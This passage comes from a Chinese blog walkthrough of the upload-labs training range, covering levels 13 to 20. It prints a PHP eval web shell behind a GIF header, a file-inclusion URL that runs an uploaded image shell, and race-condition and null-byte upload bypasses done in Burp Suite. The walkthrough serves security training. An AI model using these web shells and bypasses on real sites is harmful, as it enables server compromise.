+<p>这里 文件名 改成自己文件的名称就可以<br><img src="/images/csdn/163567978/d457394659de4ecdb998df2ace35c968.png" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/b78beb49602e4958b51af62484345609.png" srcset="/img/loading.gif" lazyload><br>制作好后，直接上传图片马即可<br><img src="/images/csdn/163567978/08dcce0db9094809851ae39859cdc76e.png" srcset="/img/loading.gif" lazyload><br>然后复制图片路径，再点击文件包含漏洞，输入以下指令访问即可</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">/<span class="hljs-keyword">include</span>.php?<span class="hljs-keyword">file</span>=upload/<span class="hljs-number">7420260807185710</span>.png<br></code></pre></td></tr></table></figure>
+
+<p>这里图片的内容换成自己的即可</p>
+<blockquote>
+<p><strong>注：</strong> 制作图片马后访问失败的概率挺高的，煮播这里也重做了好几次图片马，所以一定要有耐心</p>
+</blockquote>
+<p><img src="/images/csdn/163567978/11755e2b38a840a29add8978b5d42e2c.png" srcset="/img/loading.gif" lazyload><br>成功进行访问</p>
+<h2 id="Pass-14和Pass-15与上述方法一致"><a href="#Pass-14和Pass-15与上述方法一致" class="headerlink" title="Pass-14和Pass-15与上述方法一致"></a>Pass-14和Pass-15与上述方法一致</h2><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h3 id="图片二次渲染漏洞"><a href="#图片二次渲染漏洞" class="headerlink" title="图片二次渲染漏洞"></a>图片二次渲染漏洞</h3><ul>
+<li><p><strong>防护原理</strong>：服务器对上传图片重新压缩、裁剪、生成，清除插入的恶意代码。</p>
+</li>
+<li><p><strong>核心特征</strong>：可上传图片马，但打开后木马代码丢失，图片被修改。</p>
+</li>
+<li><p><strong>绕过方法</strong>：在图片非渲染区域插入代码（PNG 数据块、GIF 帧间隙、EXIF 信息），例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br>图片像素数据<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>这里我们需要利用工具010editor，可以在csdn上找一下该工具进行下载，下好后还是跟着我一步步走就可以</p>
+<p>先修改图片码格式为.gif，然后上传gif图片马，上传成功后，将其另存为另一个图片马<br><img src="/images/csdn/163567978/2d27f83180d64c0ba6a68b4e11dcab85.png" srcset="/img/loading.gif" lazyload><br>然后用010editor打开另存的gif图片马<br><img src="/images/csdn/163567978/1b9a7dc9ae1649be9cce4308fc688291.png" srcset="/img/loading.gif" lazyload><br>在最后一列找个位置，插入一句话木马即可<br><img src="/images/csdn/163567978/674b713f47b3455ea3c95463a092583d.png" srcset="/img/loading.gif" lazyload><br>然后将制作好的图片马上传并进行访问即可，最后效果如图<br><img src="/images/csdn/163567978/8338b51e057b417c9c60c1ef686df3a0.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><ul>
+<li><p><strong>防护原理</strong>：服务器先临时保存文件，再校验，不合格则删除，存在时间差。</p>
+</li>
+<li><p><strong>核心特征</strong>：文件上传成功后瞬间被删除，无法正常访问。</p>
+</li>
+<li><p><strong>绕过方法</strong>：Burp Suite 多线程并发上传，同时高频访问文件路径，抢在删除前执行。</p>
+</li>
+</ul>
+<p>这里我们直接上传php文件即可，然后通过bp拦截，发到爆破(Intruder)模块<br><img src="/images/csdn/163567978/f5393a2af48b4a2bb7a9e2bc1c531c7b.png" srcset="/img/loading.gif" lazyload><br>然后在php后面加个1，然后添加攻击<br><img src="/images/csdn/163567978/443f6a37ad774bb5be70f1df2ae86a7d.png" srcset="/img/loading.gif" lazyload><br>之后看向右边，模式选null payload的，然后选 continue 就可以</p>
+<p>然后点开始攻击，并同时切到关卡界面的shell.php路径下一直刷新，直至出现内容即可<br><img src="/images/csdn/163567978/b9c549ce0548464592a8ea5205dab39a.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>和前一关比较类似，不过我们这里需要先对shell.php进行一下压缩，压缩成. 7z 的形式，然后上传shell.php.7z，剩下的步骤跟条件竞争一样<br><img src="/images/csdn/163567978/3c484e96995b4d90ad0a1f4982710af2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>本关绕过同样也是采用Post形式的00截断，只是要注意修改的位置即可</p>
+<p>上传.php文件并抓包</p>
+<p><img src="/images/csdn/163567978/ec214c3565674a3aa372674fdddd846b.png" srcset="/img/loading.gif" lazyload><br><img src="/images/csdn/163567978/0a02889606b4443091e182f07d60f799.jpeg" srcset="/img/loading.gif" lazyload><br>然后还和第12关一样，对%00进行Url解码，最后进行访问，把php后面的部分去掉即可<br><img src="/images/csdn/163567978/2a6b65e95e914c379785757071fbb1c7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>同样，先上传shell.php然后进行抓包，然后修改成以下形式<br><img src="/images/csdn/163567978/b99bb1c5e5ac44698d1e8c2e5becf53f.png" srcset="/img/loading.gif" lazyload><br>之后进行访问，即可成功 get shell<br><img src="/images/csdn/163567978/d11823c3864d4f66bd8a0b33b949f994.png" srcset="/img/loading.gif" lazyload></p>
+<p>本关难度较高，且揉合了之前的东西，如果是新手的话，不建议进行深究</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
+      
+        <a href="/tags/upload-labs/" class="print-no-link">#upload-labs</a>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>upload-labs全靶场通关教程（超全超详细！适用于零基础）</div>
+      <div>https://chiya-66.github.io/2026/08/07/upload-labs全靶场通关教程/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/08/08/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/" title="解析漏洞与编辑器漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">解析漏洞与编辑器漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/04/Ctf%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="Ctf做题笔记">
+                        <span class="hidden-mobile">Ctf做题笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
